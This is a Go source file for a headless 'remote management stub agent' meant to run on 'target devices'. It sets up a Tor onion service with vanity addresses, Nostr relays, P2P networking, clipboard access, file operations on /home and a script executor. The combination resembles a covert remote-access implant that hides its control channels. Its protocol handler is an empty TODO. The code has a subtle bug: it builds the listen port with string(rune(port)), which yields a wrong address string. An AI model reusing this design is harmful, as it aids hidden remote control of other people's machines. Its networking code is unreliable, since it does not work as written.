// Package main implements the Remote Management Stub Agent.
// This is a headless, background service designed to run on target devices.
// It has no GUI and uses only standard library and minimal dependencies.
// The stub is compiled for Windows (AMD64), Linux (AMD64), and Linux (ARM for Raspberry Pi).
package main

import (
    "context"
    "flag"
    "log"
    "net"
    "os"
    "os/signal"
    "syscall"

    "github.com/remotemgmt/gobased-remote-mgmt/pkg/clipboard"
    "github.com/remotemgmt/gobased-remote-mgmt/pkg/fileops"
    "github.com/remotemgmt/gobased-remote-mgmt/pkg/metrics"
    "github.com/remotemgmt/gobased-remote-mgmt/pkg/network"
    "github.com/remotemgmt/gobased-remote-mgmt/pkg/nostr"
    "github.com/remotemgmt/gobased-remote-mgmt/pkg/scripts"
    "github.com/remotemgmt/gobased-remote-mgmt/pkg/tormanager"
)

var (
    version       = "0.1.0"
    stubID        = flag.String("id", "", "Stub ID (defaults to hostname)")
    port          = flag.Int("port", 9000, "Listen port")
    torPort       = flag.Int("tor-port", 9001, "Tor onion service port")
    nostrRelays   = flag.String("nostr-relays", "wss://relay.damus.io", "Comma-separated Nostr relay URLs")
    vanityPattern = flag.String("vanity", "", "Tor vanity pattern (regex)")
    debug         = flag.Bool("debug", false, "Enable debug logging")
)

func main() {
    flag.Parse()

    if !*debug {
        log.SetFlags(0)
    } else {
        log.SetFlags(log.LstdFlags | log.Lshortfile)
    }

    log.Printf("Remote Management Stub Agent v%s starting...", version)

    ctx, cancel := context.WithCancel(context.Background())
    defer cancel()

    // Handle signals
    sigChan := make(chan os.Signal, 1)
    signal.Notify(sigChan, syscall.SIGINT, syscall.SIGTERM)

    go func() {
        sig := <-sigChan
        log.Printf("Received signal: %v", sig)
        cancel()
    }()

    // Initialize stub
    if err := runStub(ctx); err != nil {
        log.Fatalf("Fatal error: %v", err)
    }

    log.Println("Stub agent stopped")
}

func runStub(ctx context.Context) error {
    // Determine stub ID
    id := *stubID
    if id == "" {
        hostname, err := os.Hostname()
        if err != nil {
            id = "stub-unknown"
        } else {
            id = hostname
        }
    }
    log.Printf("Stub ID: %s", id)

    // Initialize Tor
    torMgr, err := tormanager.NewTorManager("/tmp/tor-data")
    if err != nil {
        return err
    }
    defer torMgr.Close()

    if err := torMgr.Initialize(); err != nil {
        log.Printf("Warning: Tor initialization failed: %v", err)
        // Continue anyway - can still work with libp2p only
    }

    // Generate or load Tor keys
    onionAddr, err := torMgr.GenerateOnionService(*vanityPattern)
    if err != nil {
        log.Printf("Warning: Onion generation failed: %v", err)
    } else {
        log.Printf("Onion address: %s", onionAddr)
    }

    // Initialize P2P networking
    p2pMgr := network.NewP2PManager(ctx)
    if err := p2pMgr.Initialize(id); err != nil {
        return err
    }
    defer p2pMgr.Close()

    // Initialize Nostr
    nostrMgr := nostr.NewNostrManager(ctx)
    if err := nostrMgr.Initialize(id, id); err != nil {
        log.Printf("Warning: Nostr initialization failed: %v", err)
    }
    defer nostrMgr.Close()

    // Initialize metrics collection
    metricsMgr := metrics.NewMetricsCollector(ctx)
    if err := metricsMgr.Start(); err != nil {
        return err
    }
    defer metricsMgr.Stop()

    // Initialize file operations
    fileMgr, err := fileops.NewFileOperationManager("/home")
    if err != nil {
        log.Printf("Warning: File manager initialization failed: %v", err)
    }

    // Initialize script executor
    scriptMgr := scripts.NewScriptExecutor()

    // Initialize clipboard manager
    clipboardMgr := clipboard.NewClipboardManager(ctx)
    defer clipboardMgr.Close()

    // Listen for incoming connections
    listener, err := net.Listen("tcp", net.JoinHostPort("127.0.0.1", string(rune(*port))))
    if err != nil {
        return err
    }
    defer listener.Close()

    log.Printf("Listening on port %d", *port)

    // Accept connections
    go func() {
        for {
            select {
            case <-ctx.Done():
                return
            default:
                conn, err := listener.Accept()
                if err != nil {
                    if isClosedError(err) {
                        return
                    }
                    log.Printf("Accept error: %v", err)
                    continue
                }

                go handleConnection(ctx, conn, fileMgr, scriptMgr, clipboardMgr, p2pMgr)
            }
        }
    }()

    // Keep running until context is cancelled
    <-ctx.Done()

    return nil
}

func handleConnection(ctx context.Context, conn net.Conn, fileMgr *fileops.FileOperationManager, scriptMgr *scripts.ScriptExecutor, clipboardMgr *clipboard.ClipboardManager, p2pMgr *network.P2PManager) {
    defer conn.Close()

    log.Printf("Incoming connection from %s", conn.RemoteAddr())

    // TODO: Implement protocol handlers
    // - Read message type
    // - Route to appropriate handler (file ops, script execution, etc.)
    // - Send response
}

func isClosedError(err error) bool {
    if err == nil {
        return false
    }

    if netErr, ok := err.(net.Error); ok && netErr.Timeout() {
        return false
    }

    errMsg := err.Error()
    return errMsg == "accept: use of closed network connection"
}
